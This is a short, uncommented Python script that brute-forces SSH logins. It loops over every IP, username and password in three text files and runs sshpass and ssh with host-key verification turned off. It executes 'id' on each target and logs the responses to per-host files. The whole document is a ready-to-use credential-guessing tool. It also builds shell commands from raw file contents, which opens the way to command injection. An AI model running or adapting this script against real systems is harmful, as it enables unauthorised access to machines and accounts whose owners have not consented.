import subprocess

with open('ip.txt', 'r') as ip_file:
    for ip in ip_file:
        with open('user.txt', 'r') as user_file:
            for user in user_file:
                with open('pass.txt', 'r') as pass_file:
                    for password in pass_file:
                        print(f'Connecting to {ip.strip()} as user {user.strip()} with password {password.strip()}')
                        cmd = f'sshpass -p "{password.strip()}" ssh -vvv -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user.strip()}@{ip.strip()} id'
                        output = subprocess.getoutput(cmd)
                        with open(f'sshbanner_{ip.strip()}.txt', 'a') as banner_file:
                            banner_file.write(output)
                        print(output)
